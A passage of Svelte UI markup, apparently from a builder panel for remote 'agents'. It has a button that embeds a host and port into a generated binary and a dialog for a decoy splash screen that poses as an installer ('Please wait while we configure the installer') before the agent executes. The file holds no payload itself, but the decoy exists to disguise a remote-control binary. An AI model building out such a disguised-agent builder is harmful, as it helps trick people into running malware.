											<Button type="button" variant="outline" size="sm" onclick={copySharedSecret}>
												{secretCopyState === 'copied' ? 'Copied' : 'Copy secret'}
											</Button>
											{#if secretCopyState === 'error'}
												<span class="text-red-500">Copy failed</span>
											{/if}
											{#if secretCopyState === 'copied'}
												<span class="text-emerald-600">Secret copied to clipboard</span>
											{/if}
										</div>
									</div>
								{/if}
								{#if buildWarnings.length}
									<div class="rounded-md border border-amber-500/60 bg-amber-500/10 p-3 text-xs">
										<p class="font-semibold text-amber-600">Warnings</p>
										<ul class="mt-1 space-y-1">
											{#each buildWarnings as warning, index (index)}
												<li>{warning}</li>
											{/each}
										</ul>
									</div>
								{/if}
							</div>
						{/if}
					</div>

					<div class="space-y-4 rounded-lg border border-border/70 bg-background/60 p-6">
						<div class="space-y-2">
							<h3 class="text-sm font-semibold">Ready to build?</h3>
							<p class="text-xs text-muted-foreground">
								Provide a host and port to embed defaults inside the generated binary. Additional
								preferences are stored for the agent to consume on first launch.
							</p>
						</div>
						<Button type="button" class="w-full" disabled={isBuilding} onclick={buildAgent}>
							{isBuilding ? 'Building…' : 'Build Agent'}
						</Button>
					</div>
				</aside>
			</div>
		</CardContent>
	</Card>
	<Dialog.Root bind:open={splashDialogOpen}>
		<Dialog.Content class="sm:max-w-2xl">
			<Dialog.Header>
				<Dialog.Title>Customize splash screen</Dialog.Title>
				<Dialog.Description>
					Adjust the decoy overlay shown before the agent executes.
				</Dialog.Description>
			</Dialog.Header>
			<div class="grid gap-6 sm:grid-cols-[minmax(0,1fr)_minmax(0,0.9fr)]">
				<div class="space-y-4">
					<div
						class="flex items-center justify-between gap-3 rounded-md border border-border/60 bg-muted/30 px-3 py-2"
					>
						<div>
							<p class="text-sm font-semibold">Splash screen enabled</p>
							<p class="text-xs text-muted-foreground">
								Include the customized splash screen in generated builds.
							</p>
						</div>
						<Switch
							bind:checked={splashScreenEnabled}
							aria-label="Enable splash screen for generated agents"
						/>
					</div>
					<div class="grid gap-2">
						<Label for="splash-title">Headline</Label>
						<Input
							id="splash-title"
							placeholder="Preparing setup"
							bind:value={splashTitle}
							disabled={!splashScreenEnabled}
						/>
					</div>
					<div class="grid gap-2">
						<Label for="splash-subtitle">Subtitle</Label>
						<Input
							id="splash-subtitle"
							placeholder="Initializing components"
							bind:value={splashSubtitle}
							disabled={!splashScreenEnabled}
						/>
						<p class="text-xs text-muted-foreground">
							Optional supporting line displayed above the headline.
						</p>
					</div>
					<div class="grid gap-2">
						<Label for="splash-message">Body copy</Label>
						<Textarea
							id="splash-message"
							placeholder="Please wait while we configure the installer."
							bind:value={splashMessage}
							class="min-h-[120px]"
							disabled={!splashScreenEnabled}
						/>
					</div>
					<div class="grid gap-3 sm:grid-cols-3">
						<div class="space-y-2">
							<Label for="splash-background">Background</Label>
							<input
								id="splash-background"
								type="color"
								bind:value={splashBackgroundColor}
								class="h-10 w-full cursor-pointer rounded-md border border-border/70 bg-background"
								disabled={!splashScreenEnabled}
							/>
						</div>
						<div class="space-y-2">
							<Label for="splash-text">Text</Label>
							<input
								id="splash-text"
								type="color"
								bind:value={splashTextColor}
								class="h-10 w-full cursor-pointer rounded-md border border-border/70 bg-background"
								disabled={!splashScreenEnabled}
							/>
						</div>
						<div class="space-y-2">
							<Label for="splash-accent">Accent</Label>
							<input
								id="splash-accent"
								type="color"
								bind:value={splashAccentColor}
								class="h-10 w-full cursor-pointer rounded-md border border-border/70 bg-background"
								disabled={!splashScreenEnabled}
							/>
						</div>
					</div>
					<div class="grid gap-2">
						<Label>Layout</Label>
						<div class="grid grid-cols-2 gap-2">
							{#each splashLayoutOptions as option (option.value)}
								<button
									type="button"
									class={`rounded-md border px-3 py-2 text-sm font-semibold transition focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 focus-visible:outline-none ${
										splashLayout === option.value
											? 'border-primary bg-primary/10 text-primary'
											: 'border-border/70 text-muted-foreground hover:border-border'
									}`}
									onclick={() => (splashLayout = option.value)}
									disabled={!splashScreenEnabled}
								>
									{option.label}
								</button>
							{/each}
						</div>
					</div>
					<div
						class="flex flex-wrap items-center justify-between gap-2 text-xs text-muted-foreground"
					>
						<span>Reset to restore the default copy and palette.</span>
						<Button
							type="button"
							variant="ghost"
							size="sm"
							onclick={resetSplashToDefaults}
							disabled={!splashScreenEnabled}
						>
							Reset to defaults
						</Button>
					</div>
				</div>
				<div class="space-y-3">
					<p class="text-xs font-semibold tracking-wide text-muted-foreground uppercase">
						Live preview
					</p>
					<div class={`rounded-lg bg-muted/40 p-4 ${splashScreenEnabled ? '' : 'opacity-60'}`}>
						{@render SplashPreview({ className: 'shadow-sm' })}
					</div>
					<p class="text-xs text-muted-foreground">
						Colors are applied using the provided hex values. Preview updates in real time.
					</p>
				</div>
			</div>
			<Dialog.Footer class="justify-end gap-2">
				<Dialog.Close>
					{#snippet child({ props })}
						<Button {...props} type="button">Done</Button>
					{/snippet}
				</Dialog.Close>
			</Dialog.Footer>
		</Dialog.Content>
	</Dialog.Root>
</div>
